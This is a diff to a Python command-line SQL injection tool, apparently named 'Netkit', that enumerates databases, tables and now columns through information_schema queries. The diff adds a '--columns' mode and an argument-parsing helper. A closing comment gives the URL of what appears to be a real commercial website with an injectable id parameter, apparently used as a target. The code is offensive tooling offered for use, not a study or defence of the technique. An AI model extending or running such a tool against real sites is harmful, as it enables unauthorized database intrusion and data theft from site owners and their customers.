@@ -7,6 +7,7 @@ from time import sleep
 from time import time
 
 ini = time()
+print()
 def sqli(pull_type: str, diretory: str, extra: str=""):
     # puxar infos
     infos = ['']
@@ -29,6 +30,8 @@ def sqli(pull_type: str, diretory: str, extra: str=""):
         infos.append(r[co:fi])
         new = []
     infos = "\n".join(set(infos))
+    if infos.replace(" ", "") == "":
+        infos = "\n\033[01;91m[+]\033[0;0m\033[01;39mNot Results.\033[0;0m"
     return infos
 
 def pull_columns():
@@ -62,29 +65,41 @@ def pull_columns():
     n -= 2
     print(f"\033[01;32m[+]\033[0;0m\033[01;39m{n} columns\033[0;0m")
 
+def pullt(require, info):
+    if not info in argv:
+        print(f"Netkit: {require} requires {info}.")
+        exit()
+    try:
+        type = argv.index(info)+1
+        type = argv[type]
+    except:
+        print("Netkit: missing arguments. Type -h to see the list of commands. ")
+        exit()
+    return type
 if "--tables" in argv:
     if "--dbs" in argv:
         print("Netkit: Args invalids")
         exit()
 
-    if not "-D" in argv:
-        print("Netkit: --tables requires -D.")
-        exit()
-    try:
-        db = argv.index("-D")+1
-        db = argv[db]
-    except:
-        print("Netkit: missing arguments. Type -h to see the list of commands. ")
+    db = pullt("--tables", "-D")
+    if db == "--tables":
+        print("Netkit: -D requires name of database.")
         exit()
     pull_columns()
     res = sqli("table_name", "information_schema.tables", f"and table_schema = '{db}'")
     print(res)
 
+elif "--columns" in argv:
+    db = pullt("--columns", "-D")
+    table = pullt("--columns", "-T")
+    pull_columns()
+    res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'")
+    print(res)
 elif "--dbs" in argv:
     pull_columns()
     res = sqli("table_schema", "information_schema.tables")
     print(res)
- 
 ini = time() - ini
 print(f"\nTime: {ini}")
+
 #http://adessocasa.com.br/site/1.5/pag_produtos_loja.php?id=18&&idfornecedor=1
